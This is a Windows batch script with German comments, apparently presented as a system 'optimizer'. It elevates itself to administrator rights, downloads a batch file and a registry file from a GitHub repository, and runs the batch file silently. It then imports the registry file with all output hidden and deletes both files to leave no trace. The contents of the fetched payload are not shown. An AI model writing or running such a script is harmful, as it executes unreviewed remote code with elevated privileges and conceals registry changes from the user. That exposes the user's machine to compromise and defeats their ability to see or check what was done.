@echo off
setlocal enabledelayedexpansion

:: =============================
:: 1. Adminrechte prüfen
:: =============================
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

:: =============================
:: 2. Desktop-Pfad ermitteln
:: =============================
for /f "tokens=2*" %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Desktop') do set "desktopPath=%%b"

:: =============================
:: 3. Dateipfade und URLs
:: =============================
set "batUrl=https://github.com/ZENZYLEovfwe/newest/raw/main/opti.bat"
set "regUrl=https://github.com/ZENZYLEovfwe/newest/raw/main/optimizter.reg"

set "batFile=%desktopPath%\opti.bat"
set "regFile=%desktopPath%\optimizter.reg"

:: =============================
:: 4. Dateien herunterladen
powershell -Command "Invoke-WebRequest -Uri '%batUrl%' -OutFile '%batFile%'" >nul 2>&1
if not exist "%batFile%" exit /b

powershell -Command "Invoke-WebRequest -Uri '%regUrl%' -OutFile '%regFile%'" >nul 2>&1
if not exist "%regFile%" exit /b

:: =============================
:: 5. Ausführen & Registry importieren
call "%batFile%" >nul 2>&1
reg import "%regFile%" >nul 2>&1

:: =============================
:: 6. Dateien löschen
del /f /q "%batFile%" >nul 2>&1
del /f /q "%regFile%" >nul 2>&1

:: =============================
:: 7. Kleines Delay vor dem Schließen
timeout /t 2 >nul
exit
